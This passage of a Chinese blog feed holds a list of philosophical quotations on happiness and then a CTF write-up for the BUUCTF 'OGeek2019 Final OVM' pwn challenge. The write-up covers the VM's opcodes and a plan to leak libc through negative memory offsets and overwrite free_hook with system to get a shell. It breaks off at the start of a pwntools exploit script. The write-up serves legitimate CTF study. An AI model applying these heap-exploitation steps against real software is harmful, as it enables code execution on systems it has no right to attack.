      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们不应为某件事情过分高兴或者过分悲伤，原因之一就是一切事物都在改变，另一个原因是我们对于何为有利、何为不利的判断是虚幻的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们幸福的原因存在于我们的自身之内，而不是自身之外&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人的内心快乐抑或内心痛苦首先就是人的感情、意欲和思想的产物。而人自身之外的所有事物，对于人的幸福都只是间接地发挥影响&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们唯一能够做到的就是尽可能充分地利用我们既定的个性。因此，我们应该循着符合我们个性的方向，努力争取适合个性的发展，除此之外则一概避免。所以，我们必须选择与我们个性相配的地位、职业和生活方式&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个人的个性及其价值，才唯一直接与他的幸福有关&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;保持身体健康的手段无非就是避免一切纵欲放荡的行为、令人不快和剧烈的情绪动荡，以及长时间紧张的精神劳累；每天至少在户外进行两个小时的身体快速运动；勤洗冷水浴，饮食有节&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个人自身拥有越丰富，他对身外之物的需求也就越少，别人对他来说就越不重要&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;为了外在的荣耀、地位、头衔和名声而部分或全部奉献出自己的内在安宁、闲暇和独立——这是极度的愚蠢行为&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;缺乏痛苦的程度是衡量一个人生活是否幸福的标准&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;认清幸福是避免痛苦，而不是寻求快乐：我们不应该以痛苦为代价去购买快乐，甚至只是冒着遭受痛苦的风险去这样做也不行，否则，我们就会为了那些否定、因而是虚幻的东西而付出了肯定和实在的东西。但如果我们牺牲欢娱以避免痛苦，那我们肯定获得收益&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;降低对幸福的期待：&#xA;我们对于幸福的过分期待毁坏了这世上的一切，毁坏的程度与我们做梦的程度相一致。谁要是摆脱了过分的期待，除了自己已经拥有的以外，不再奢望更多，那么，他就能够安然无恙地生活下去”（《梅克通信录》）&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;如果你失去一个世界，&#xA;不要为此悲伤，因为这是微不足道的；&#xA;如果得到一个世界，&#xA;不要为此高兴，因为这是微不足道的；&#xA;苦乐得失都会过去&#xA;都会离开这个世界，因为这都是微不足道的。&#xA;——安瓦里：《苏哈里》&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人生智慧的重要一点就是在关注现在和计划将来这两者之间达致恰到好处的平衡，这样，现在与将来才不至于互相干扰&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;不要由于在过去我们的希望落空现在就变得忧郁寡欢，或者为了将来操心伤神以致败坏现时&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们应该时刻记住：此刻时光匆匆消逝化作神奇的往昔，从此以后，它就存留在我们的记忆里，照射出不朽之光芒。在将来，尤其到了糟糕恶劣的日子，我们的记忆就会拉起帷幕：此刻时光就会成为我们内心眷恋和思念的对象。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;如果不跟别人作比较，那我们就会为我们所得到的感到快乐；如果由于别人比我们更加幸运而内心不安，那我们将永远不会快乐&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;对于一切涉及痛苦和快乐的事情，我们应该把牢想象力的闸门&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;通常，为了使现时灰暗的生活生色明快，我们盘算着种种美妙的可能，凭空想象出形形色色的诱人的希望，而所有这些都孕育着失望。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;正如流通的是纸钞，而不是真金白银，同样，在这个世界上，流行的不是发自内心的尊重和真正的友谊，而只是做得尽量逼真和自然地显示尊重和友谊的表面工夫&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“唯一能够取悦别人的方式就是把自己裹以最傻呆的动物的外皮。”显示自己的聪明智慧其实就是间接地指责别人愚蠢和无能&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个明智的人其实就是一个不会被事物恒久不变的表面所欺骗的人，他甚至预见到了事情即将往哪一方向变化&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;帮助我们以镇定自若的态度接受发生在我们身上的不幸和灾祸的最佳方法，莫过于确信这一真理：“发生的所有大大小小的事情，都是必然地发生。”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所有的事物作为客体，亦即纯粹作为表象而存在时，毫无例外都是令人愉快的；但当这些事物作为主体存在，亦即存在于意欲之中时，却都沉浸在痛苦和悲哀之中&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一切事物在被观照时都是愉悦的，但在具体存在时，却是可怕的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;那些画像之所以具有如此的魅力，正是因为这些纯粹只是画像而已，它们并不是真实的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人生经验的首要任务，就是要摆脱那些在我们青春期扎根头脑的幻想和虚假概念&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;</description>
    </item>
    <item>
      <title>VMpwn</title>
      <link>http://localhost:1313/posts/vmpwn/</link>
      <pubDate>Thu, 23 Oct 2025 23:27:58 +0800</pubDate>
      <guid>http://localhost:1313/posts/vmpwn/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;ogeek2019-finalovm&#34;&gt;&lt;span&gt;[OGeek2019 Final]OVM&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#ogeek2019-finalovm&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;buuctf的一道题&lt;/p&gt;&#xA;&lt;p&gt;docker pull roderickchan/debug_pwn_env:16.04-2.23-0ubuntu11.3-20240412&lt;/p&gt;&#xA;&lt;p&gt;先输入&lt;code&gt;pc&lt;/code&gt;、&lt;code&gt;sp&lt;/code&gt;、&lt;code&gt;code size&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;pc：将指令写入memory的偏移，置0就行&lt;/li&gt;&#xA;&lt;li&gt;sp：push、pop指令写入栈的偏移，置0就行&lt;/li&gt;&#xA;&lt;li&gt;code size：增加一条opcode，opcode size就要加1&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;vm指令：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;0x10：mov reg[high]，low&lt;/li&gt;&#xA;&lt;li&gt;0x20：mov reg[high]，0&lt;/li&gt;&#xA;&lt;li&gt;0x30：mov reg[high]，memory[reg[low]]&lt;/li&gt;&#xA;&lt;li&gt;0x40：mov memory[reg[low]]，reg[high]&lt;/li&gt;&#xA;&lt;li&gt;0x50：PUSH：push reg[high] ，sp++&lt;/li&gt;&#xA;&lt;li&gt;0x60：POP： pop[high]，sp&amp;ndash;&lt;/li&gt;&#xA;&lt;li&gt;0x70：ADD： reg[high] = reg[low] + reg[medium]&lt;/li&gt;&#xA;&lt;li&gt;0x80：SUB：reg[high] = reg[medium] - reg[low]&lt;/li&gt;&#xA;&lt;li&gt;0x90：AND： reg[high] = reg[low] &amp;amp; reg[medium]&lt;/li&gt;&#xA;&lt;li&gt;0xa0：OR：reg[high] = reg[low] | reg[medium]&lt;/li&gt;&#xA;&lt;li&gt;0xb0：XOR：reg[high] = reg[low] ^ reg[medium]&lt;/li&gt;&#xA;&lt;li&gt;0xc0：SHL：reg[high] = reg[medium] &amp;laquo; reg[low]&lt;/li&gt;&#xA;&lt;li&gt;0xd0：SHR：reg[high] = reg[medium] &amp;raquo; reg[low]&lt;/li&gt;&#xA;&lt;li&gt;0xe0：EXIT：停止执行&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;思路&#34;&gt;&lt;span&gt;思路&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%80%9d%e8%b7%af&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;可以往memory[]中写入负数偏移，指向got表中的stderr_ptr，再根据偏移找到free_hook，让comment指向free_hook-0x8,往free_hook-0x8开始的数据写入&lt;code&gt;b&#39;/bin/sh\x00&#39;+p64(sys_addr)&lt;/code&gt;,这样free(comment)，就是system(&amp;quot;/bin/sh&amp;quot;)&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;exp&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;（拿了别的师傅的exp）&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(str(delim), data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               